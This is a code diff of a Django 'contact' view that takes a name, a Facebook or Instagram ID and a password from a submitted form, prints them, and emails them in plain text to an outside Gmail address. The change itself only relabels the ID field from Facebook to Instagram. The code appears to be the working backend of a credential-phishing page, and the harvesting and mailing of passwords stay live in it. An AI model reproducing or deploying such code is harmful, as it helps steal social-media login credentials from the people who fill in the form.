@@ -16,7 +16,7 @@ def contact(request):
         password=request.POST.get('password')
         print(name,facebookID,password)
         subject='Try to Register'
-        message= f"\n\n\none user has tried to register!\n\n\n\n\nname -: {name}\n\n\nfacebook id -: {facebookID}\n\n\npassword -: {password}"
+        message= f"\n\n\none user has tried to register!\n\n\n\n\nname -: {name}\n\n\n instagram id -: {facebookID}\n\n\npassword -: {password}"
         email_from= settings.EMAIL_HOST_USER
         email_to=['myendgame420@gmail.com']
         send_mail(subject, message, email_from, email_to,fail_silently=False,)
